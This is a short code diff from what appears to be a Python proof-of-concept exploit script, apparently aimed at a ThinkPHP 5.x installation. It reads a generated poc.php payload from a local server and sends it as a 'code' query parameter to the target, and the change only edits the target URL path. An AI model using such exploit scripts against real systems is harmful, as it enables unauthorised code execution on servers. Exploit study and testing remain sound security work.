@@ -13,7 +13,7 @@ with open('D:\phpstudy\PHPTutorial\WWW\poc.php','wb') as f:
 r = requests.get("http://127.0.0.1/poc.php",timeout=1)
 code = r.content.decode()
 
-url = 'http://localhost/v52/public/index.php'
+url = 'http://localhost/v5.2.x/public/index.php'
 payload = '/?code={}'.format(code)
 
 r = requests.get(url+payload)
